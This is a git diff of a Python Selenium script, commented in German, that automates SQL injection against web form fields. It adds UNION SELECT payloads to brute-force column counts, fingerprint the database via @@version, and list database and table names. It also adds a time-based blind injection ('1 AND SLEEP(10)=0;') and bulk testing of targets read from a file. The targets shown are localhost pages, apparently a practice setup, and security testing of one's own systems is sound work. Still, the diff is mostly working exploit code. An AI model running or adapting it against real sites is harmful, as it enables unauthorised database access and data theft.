@@ -26,6 +26,9 @@ injectionPossible = False
 nameOfDatabase = ""
 nameOfTables = []
 
+#files
+websiteFile = "websiteFile.txt"
+resultFile  = "resultFile.txt"
 
 """FÜhrt injections versuche auf einem input feld aus
 BRUTFORCE für die anzahl der spalten"""
@@ -92,7 +95,6 @@ def findOutTablesUnionTable(url, extraColumns, database="MY_DATABASE"):
     id = "searchProduct"
     pageContent = goToWebsiteAndInsert(url, id,injectionString)
     tableNames = clearResult(pageContent)
-    print(tableNames)
     return tableNames
 
 """geht nur wenn es sich um string handelt """
@@ -108,30 +110,6 @@ def findOutNameOfDatabase(url, extraColumns):
     if database:
         return database
 
-def tableLogic(url):
-    global injectionPossible
-    global nameOfDatabase
-    global nameOfTables
-
-    for i in range(MAX_TABLE_SIZE):
-        unionAttackOnTable(url,i)
-    if(injectionPossible == True):
-        for i in range(MAX_TABLE_SIZE):
-            database = findOutNameOfDatabase(url,i)
-            if database:
-                nameOfDatabase = database
-                """
-        if nameOfDatabase:
-            for i in range(MAX_TABLE_SIZE):
-                tables = findOutTablesUnionTable(url,i,nameOfDatabase)
-                if tables:
-                    nameOfTables = tables
-                    """
-
-        print("injection war möglich")
-        print("Die datenbank heisßt" + str(nameOfDatabase))
-       # print("Die tabellen heißen: " + str(nameOfTables))
-
 def unionAttackOnTable(url, extraColumns, id):
     fillerString = ""
     for i in range(extraColumns):
@@ -139,25 +117,82 @@ def unionAttackOnTable(url, extraColumns, id):
     injectionString = '" UNION SELECT ' + fillerString + ' "INJECTIONPOSIBLE"# '
     result = goToWebsiteAndInsert(url, id, injectionString)
     print(checkIfInjectionIsSuccessful(result))
+
+def sqlTypidentifizieren(url, extraColumns, id):
+    #test
+
+    fillerString = ""
+    for i in range(extraColumns):
+        fillerString = fillerString + "NULL as col" + str(i) + ","
+    injectionString = '" UNION SELECT ' + fillerString + ' @@version; # '
+    print(injectionString)
+    pageContent = goToWebsiteAndInsert(url, id, injectionString)
+    if (pageContent.find("maria") != -1):
+        print("MARIA DB ERKANNT!")
+    else:
+        print("Ist NICHT maria")
+        return False
+
+
+def tableLogic(url, id):
+    global injectionPossible
+    global nameOfDatabase
+    global nameOfTables
+
+    for i in range(MAX_TABLE_SIZE):
+        unionAttackOnTable(url,i,id)
+    if(injectionPossible == True):
+        for i in range(MAX_TABLE_SIZE):
+            database = findOutNameOfDatabase(url,i)
+            if database:
+                nameOfDatabase = database
+        if database:
+            for i in range(MAX_TABLE_SIZE):
+                tables = findOutTablesUnionTable(url, i, nameOfDatabase)
+                if tables:
+                    nameOfTables = tables
+
+        print("injection war möglich")
+        print("Die datenbank heisßt" + nameOfDatabase)
+        print("Die tabellen heißen: " + nameOfTables)
+
+def readFileForWebsites():
+    targets = []
+    with open(websiteFile, 'r') as f:
+        for line in f:
+            website = {}
+            parts = line.split(',')
+            website["url"] = parts[0]
+            del parts[0]
+            for i in range(len(parts)):
+                parts[i] = parts[i].replace("\n", "")
+            website["inputfields"] = parts
+            targets.append(website)
+    return targets
+def writeREsultInFile(result):
+    with open(resultFile, "w") as f:
+        for line in result:
+            f.write(str(line["url"]) + " " + str(line["inputfields"]) + " " + str(line["testResult"]) + "\n")
 """ TImmer injection """
 def timmerAttack(url, id):
     delayTime = 8                                       #seconds which are delay from thread
-    thread = threading.Thread(target=check_website, args=(url,id))
+    thread = threading.Thread(target=checckWebsiteTimmer, args=(url,id))
     start_time = time.perf_counter()
     thread.start()
     thread.join()
     elapsed_time = time.perf_counter() - start_time
     if(elapsed_time > 18):
         print("INJECTION möglich!")
+        return True
     else:
-        pass
+        return False
 
-def check_website(url,id):
+def checckWebsiteTimmer(url,id):
     driver = webdriver.Chrome()
     driver.get(url)
     input_field = driver.find_element(By.ID, id)
-    #input_field.send_keys("1 AND SLEEP(10)=0;")
-    input_field.send_keys("1")
+    input_field.send_keys("1 AND SLEEP(10)=0;")
+    #input_field.send_keys("1")
     input_field.send_keys(Keys.RETURN)
     driver.quit()
 """
@@ -249,4 +284,32 @@ try:
 except:
     pass
 """
-timmerAttack("http://localhost:8000/Views/timerIndex.php", "id")
+"""
+url = "http://localhost:8000/indexWebshop.php"
+for i in range(MAX_TABLE_SIZE):
+    tables = findOutTablesUnionTable(url, i)
+    if tables:
+        nameOfTables = tables
+        print("Die tables sind : " + tables)
+    else:
+        print("KEINE TABLES !")
+        """
+
+"""
+targets = readFileForWebsites()
+testResults = targets
+for i, target in enumerate(targets):
+    for x,field in enumerate(target["inputfields"]):
+        print("teste : " + target["url"] + " mit der id: " + field)
+        result = timmerAttack(target["url"], field)
+        testResults[i]["testResult"] = result
+print(testResults)
+
+writeREsultInFile(testResults)
+
+"""
+sqlTypidentifizieren("http://localhost:8000/Views/webshopView.php", 2, "searchProduct")
+#tableLogic("http://localhost:8000/indexWebshop.php", "searchProduct")
+#timmerAttack("http://localhost:8000/Views/timerIndex.php", "id")
+
+
